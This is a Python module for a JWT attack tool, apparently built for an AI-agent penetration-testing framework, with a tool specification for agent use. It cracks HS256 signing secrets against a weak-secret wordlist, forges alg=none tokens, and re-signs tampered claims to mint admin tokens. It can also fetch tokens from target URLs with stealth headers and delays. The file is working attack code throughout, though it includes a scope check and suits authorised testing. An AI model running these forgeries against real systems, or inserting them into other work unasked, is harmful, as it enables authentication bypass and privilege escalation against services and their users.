"""JWT attack tool — algorithm confusion, claim tampering, weak secret detection."""

import base64
import hashlib
import hmac
import json
import logging
import re

from .scope_checker import scope_guard
from .http_utils import retry_request
from .stealth import stealth_headers, stealth_delay
from .logs_helper import log_path

logger = logging.getLogger(__name__)

# Common weak secrets for brute force
WEAK_SECRETS = [
    "secret",
    "password",
    "123456",
    "admin",
    "key",
    "test",
    "jwt_secret",
    "changeme",
    "supersecret",
    "qwerty",
    "jwt",
    "token",
    "default",
    "example",
    "mysecret",
    "your-256-bit-secret",
    "secret123",
    "passw0rd",
]


def _b64url_decode(s: str) -> bytes:
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _parse_jwt(token: str) -> tuple:
    """Parse JWT into (header_dict, payload_dict, signature_b64)."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ValueError("Not a valid JWT (expected 3 parts)")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    return header, payload, parts[2]


def _sign_hs256(header_b64: str, payload_b64: str, secret: str) -> str:
    msg = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    return _b64url_encode(sig)


def _forge_none_alg(payload: dict) -> str:
    """Forge a JWT with alg=none (algorithm confusion attack)."""
    header = {"alg": "none", "typ": "JWT"}
    h = _b64url_encode(json.dumps(header).encode())
    p = _b64url_encode(json.dumps(payload).encode())
    return f"{h}.{p}."


def _brute_secret(token: str) -> str | None:
    """Try common weak secrets against HS256 JWT."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None
    msg = f"{parts[0]}.{parts[1]}".encode()
    target_sig = _b64url_decode(parts[2])

    for secret in WEAK_SECRETS:
        sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
        if hmac.compare_digest(sig, target_sig):
            return secret
    return None


def run(target: str = "", token: str = "", action: str = "analyze") -> str:
    """
    JWT analysis and attack tool.

    Actions:
      analyze  — decode and analyze a JWT token
      crack    — attempt to brute-force the signing secret
      forge    — forge a token with alg=none
      tamper   — modify claims (e.g., role=admin) and re-sign with cracked secret
      fetch    — fetch a JWT from target URL and analyze it
    """
    findings = []

    # If target URL provided, fetch JWT from response
    if target and action == "fetch":
        guard = scope_guard(target)
        if guard:
            return guard
        stealth_delay()
        try:
            resp = retry_request(target, headers=stealth_headers(), timeout=10)
            # Look for JWT in response headers and body
            jwt_pattern = r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+"
            found_tokens = re.findall(jwt_pattern, resp.text)
            for h_name, h_val in resp.headers.items():
                found_tokens.extend(re.findall(jwt_pattern, h_val))

            if not found_tokens:
                return f"No JWT tokens found at {target}"

            token = found_tokens[0]
            findings.append(f"[INFO] JWT found at {target}")
            if len(found_tokens) > 1:
                findings.append(
                    f"[INFO] {len(found_tokens)} JWT tokens found in response"
                )
        except Exception as e:
            return f"Failed to fetch JWT from {target}: {e}"

    if not token:
        return "No JWT token provided. Use 'token' parameter or 'fetch' action with target URL."

    # Parse token
    try:
        header, payload, sig = _parse_jwt(token)
    except (ValueError, json.JSONDecodeError) as e:
        return f"Invalid JWT: {e}"

    findings.append(
        f"[INFO] JWT Header: alg={header.get('alg')}, typ={header.get('typ')}"
    )
    findings.append(f"[INFO] JWT Payload keys: {list(payload.keys())}")

    # Check for sensitive claims
    if "role" in payload:
        findings.append(f"[INFO] Role claim: {payload['role']}")
    if "admin" in payload:
        findings.append(f"[MEDIUM] Admin claim present: {payload['admin']}")
    if "sub" in payload:
        findings.append(f"[INFO] Subject: {payload['sub']}")
    if "exp" in payload:
        import time

        if payload["exp"] < time.time():
            findings.append("[MEDIUM] Token is EXPIRED but may still be accepted")
    if "iat" not in payload:
        findings.append("[LOW] No 'iat' (issued at) claim — token replay risk")
    if "jti" not in payload:
        findings.append("[LOW] No 'jti' (token ID) — no replay protection")

    # Algorithm checks
    alg = header.get("alg", "").upper()
    if alg == "NONE":
        findings.append("[CRITICAL] Algorithm is 'none' — token is unsigned!")
    elif alg == "HS256":
        findings.append(
            "[INFO] Algorithm: HS256 (symmetric) — weak secret may be crackable"
        )
    elif alg in ("RS256", "ES256"):
        findings.append(
            f"[INFO] Algorithm: {alg} (asymmetric) — check for key confusion"
        )

    # Action: crack
    if action in ("crack", "analyze", "tamper"):
        if alg == "HS256":
            cracked = _brute_secret(token)
            if cracked:
                findings.append(f"[CRITICAL] JWT secret CRACKED: '{cracked}'")
                findings.append(
                    f"[CRITICAL] Attacker can forge arbitrary tokens with this secret"
                )

                # If tamper action, forge a modified token
                if action == "tamper":
                    tampered = dict(payload)
                    if "role" in tampered:
                        tampered["role"] = "admin"
                    elif "admin" in tampered:
                        tampered["admin"] = True
                    else:
                        tampered["role"] = "admin"
                    h = _b64url_encode(json.dumps(header).encode())
                    p = _b64url_encode(json.dumps(tampered).encode())
                    new_sig = _sign_hs256(h, p, cracked)
                    forged = f"{h}.{p}.{new_sig}"
                    findings.append(f"[CRITICAL] Forged admin token: {forged[:80]}...")
            else:
                findings.append("[INFO] JWT secret not in common wordlist (18 tested)")

    # Action: forge with alg=none
    if action in ("forge", "analyze"):
        none_token = _forge_none_alg(payload)
        findings.append(f"[HIGH] alg=none forged token: {none_token[:80]}...")
        findings.append(
            "[HIGH] Test this token against the API — if accepted, authentication is broken"
        )

    # Save results
    result_path = log_path("jwt_analysis.json")
    try:
        with open(result_path, "w", encoding="utf-8") as f:
            json.dump(
                {"header": header, "payload": payload, "findings": findings},
                f,
                indent=2,
            )
    except Exception:
        pass

    return f"JWT Analysis — {len(findings)} findings:\n" + "\n".join(
        f"  {f}" for f in findings
    )


TOOL_SPEC = {
    "name": "run_jwt_attacks",
    "description": (
        "JWT security analysis and attack tool. Decodes tokens, checks for weak secrets "
        "(brute force HS256), tests alg=none confusion, detects missing security claims, "
        "and can forge tampered tokens. Use 'fetch' action to extract JWTs from URLs."
    ),
    "input_schema": {
        "type": "object",
        "properties": {
            "target": {
                "type": "string",
                "description": "URL to fetch JWT from (for 'fetch' action)",
            },
            "token": {"type": "string", "description": "JWT token to analyze"},
            "action": {
                "type": "string",
                "description": "Action: analyze (default), crack, forge, tamper, fetch",
            },
        },
        "required": [],
    },
}
